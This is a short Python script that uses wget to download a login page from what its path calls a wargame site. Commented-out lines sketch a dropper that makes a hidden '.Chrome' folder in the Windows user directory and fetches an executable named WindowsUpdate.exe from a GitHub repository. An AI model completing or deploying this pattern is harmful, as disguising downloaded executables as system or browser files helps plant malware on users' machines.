from wget import download
#from os import system, getlogin, mkdir
#from os.path import exists
#from shutil import copy

#user = getlogin()
#if not exists(f'C:\\Users\\{user}\\.Chrome'):
#	mkdir(f'C:\\Users\\{user}\\.Chrome')


#url = 'https://github.com/Zombrooc/Zombrooc_02/blob/master/WindowsUpdate.exe'
url = 'http://www.100security.com.br/wargame/login.php'
filename = download(url=url)

